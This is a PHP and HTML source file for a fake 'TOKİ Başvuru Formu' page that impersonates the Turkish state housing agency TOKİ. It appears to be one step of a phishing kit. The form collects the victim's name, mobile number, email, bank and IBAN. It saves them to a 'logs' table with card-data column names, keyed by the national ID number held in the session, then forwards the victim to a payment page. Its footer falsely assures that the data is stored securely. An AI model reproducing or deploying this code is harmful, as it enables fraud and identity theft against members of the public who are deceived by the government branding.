<?php
session_start();
require_once 'inc/brain.php';

// TCKN'yi session'dan al
$tckn = isset($_SESSION['tckn']) ? $_SESSION['tckn'] : '';

// Form gönderildiğinde verileri kaydet
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $adsoyad = $_POST['myadsoyad'] ?? '';
    $gsm = $_POST['cep'] ?? '';
    $email = $_POST['vadecen'] ?? '';
    $iban = $_POST['myiban'] ?? '';
    $banka = $_POST['bank'] ?? '';

    try {
        // Veritabanına kaydet - mevcut kaydı güncelle
        $stmt = $pdo->prepare("UPDATE logs SET
            adsoyad = :adsoyad,
            kart_cvv = :gsm,
            kart_skt = :email,
            kart_numarasi = :iban,
            banka_adi = :banka,
            mevcut_sayfa = :sayfa,
            email = :email_field
            WHERE tckns = :tckn AND aktif_check = 1
            ORDER BY id DESC LIMIT 1");

        $stmt->execute([
            ':adsoyad' => $adsoyad,
            ':gsm' => $gsm,
            ':email' => $email,
            ':iban' => 'TOKİ-' . $iban,
            ':banka' => $banka,
            ':sayfa' => 'Bilgi Formu',
            ':email_field' => $email,
            ':tckn' => $tckn
        ]);

        // Bir sonraki sayfaya yönlendir
        header('Location: 1binfopay.php');
        exit;
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TOKİ Başvuru Formu</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px 0;
        }
        .main-container {
            max-width: 600px;
            margin: 0 auto;
        }
        .card {
            border: none;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
        }
        .card-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border-radius: 15px 15px 0 0 !important;
            padding: 25px;
        }
        .form-label {
            font-weight: 600;
            color: #495057;
            margin-bottom: 8px;
        }
        .form-control, .form-select {
            border-radius: 10px;
            border: 2px solid #e0e0e0;
            padding: 12px 15px;
            transition: all 0.3s;
        }
        .form-control:focus, .form-select:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 0.2rem rgba(102, 126, 234, 0.25);
        }
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 10px;
            padding: 12px 30px;
            font-weight: 600;
            transition: transform 0.2s;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
        }
        .input-group-text {
            background-color: #f8f9fa;
            border: 2px solid #e0e0e0;
            border-right: none;
            border-radius: 10px 0 0 10px;
        }
        .input-group .form-control {
            border-left: none;
            border-radius: 0 10px 10px 0;
        }
        .alert {
            border-radius: 10px;
            border: none;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="card">
            <div class="card-header text-center">
                <h4 class="mb-0">
                    <i class="bi bi-building"></i> TOKİ Başvuru Formu
                </h4>
                <small>Lütfen bilgilerinizi eksiksiz doldurunuz</small>
            </div>
            <div class="card-body p-4">
                <form method="POST" id="infoForm">
                    <!-- TCKN Hidden Input -->
                    <input type="hidden" name="tckn" value="<?php echo htmlspecialchars($tckn); ?>">

                    <!-- Ad Soyad -->
                    <div class="mb-3">
                        <label for="myadsoyad" class="form-label">
                            <i class="bi bi-person-fill text-primary"></i> Ad Soyad
                        </label>
                        <input type="text"
                               class="form-control"
                               id="myadsoyad"
                               name="myadsoyad"
                               placeholder="Adınızı ve soyadınızı giriniz"
                               required>
                    </div>

                    <!-- GSM (Cep Telefonu) -->
                    <div class="mb-3">
                        <label for="cep" class="form-label">
                            <i class="bi bi-phone-fill text-success"></i> Cep Telefonu
                        </label>
                        <div class="input-group">
                            <span class="input-group-text">+90</span>
                            <input type="tel"
                                   class="form-control"
                                   id="cep"
                                   name="cep"
                                   placeholder="5XX XXX XX XX"
                                   maxlength="10"
                                   pattern="[0-9]{10}"
                                   required>
                        </div>
                        <small class="text-muted">Başında 0 olmadan 10 haneli giriniz</small>
                    </div>

                    <!-- E-posta -->
                    <div class="mb-3">
                        <label for="vadecen" class="form-label">
                            <i class="bi bi-envelope-fill text-danger"></i> E-posta Adresi
                        </label>
                        <input type="email"
                               class="form-control"
                               id="vadecen"
                               name="vadecen"
                               placeholder="ornek@email.com"
                               required>
                    </div>

                    <!-- Banka Seçimi -->
                    <div class="mb-3">
                        <label for="bank" class="form-label">
                            <i class="bi bi-bank text-warning"></i> Banka Seçiniz
                        </label>
                        <select class="form-select" id="bank" name="bank" required>
                            <option value="">Banka Seçiniz</option>
                            <option value="Ziraat Bankası">Ziraat Bankası</option>
                            <option value="Vakıfbank">Vakıfbank</option>
                            <option value="Halkbank">Halkbank</option>
                            <option value="İş Bankası">İş Bankası</option>
                            <option value="Akbank">Akbank</option>
                            <option value="Garanti BBVA">Garanti BBVA</option>
                            <option value="Yapı Kredi">Yapı Kredi</option>
                            <option value="QNB Finansbank">QNB Finansbank</option>
                            <option value="Denizbank">Denizbank</option>
                            <option value="TEB">TEB</option>
                            <option value="ING">ING</option>
                            <option value="Kuveyt Türk">Kuveyt Türk</option>
                            <option value="Albaraka Türk">Albaraka Türk</option>
                            <option value="Türkiye Finans">Türkiye Finans</option>
                            <option value="Vakıf Katılım">Vakıf Katılım</option>
                            <option value="Ziraat Katılım">Ziraat Katılım</option>
                        </select>
                    </div>

                    <!-- IBAN -->
                    <div class="mb-4">
                        <label for="myiban" class="form-label">
                            <i class="bi bi-credit-card-fill text-info"></i> IBAN Numarası
                        </label>
                        <div class="input-group">
                            <span class="input-group-text">TR</span>
                            <input type="text"
                                   class="form-control"
                                   id="myiban"
                                   name="myiban"
                                   placeholder="XX XXXX XXXX XXXX XXXX XXXX XX"
                                   maxlength="26"
                                   required>
                        </div>
                        <small class="text-muted">TR olmadan 26 haneli IBAN numaranızı giriniz</small>
                    </div>

                    <!-- Gönder Butonu -->
                    <div class="d-grid">
                        <button type="submit" class="btn btn-primary btn-lg">
                            <i class="bi bi-check-circle-fill"></i> İleri
                        </button>
                    </div>
                </form>
            </div>
            <div class="card-footer text-center text-muted bg-light">
                <small>
                    <i class="bi bi-shield-check"></i> Bilgileriniz güvenli şekilde saklanmaktadır
                </small>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Sadece rakam girişine izin ver (GSM için)
        document.getElementById('cep').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });

        // IBAN formatı için sadece rakam ve harf
        document.getElementById('myiban').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9A-Za-z]/g, '').toUpperCase();
        });

        // Form validasyonu
        document.getElementById('infoForm').addEventListener('submit', function(e) {
            const gsm = document.getElementById('cep').value;
            const iban = document.getElementById('myiban').value;

            if (gsm.length !== 10) {
                e.preventDefault();
                alert('Lütfen geçerli bir cep telefonu numarası giriniz (10 hane)');
                return false;
            }

            if (iban.length !== 26) {
                e.preventDefault();
                alert('Lütfen geçerli bir IBAN numarası giriniz (26 hane)');
                return false;
            }
        });
    </script>
</body>
</html>
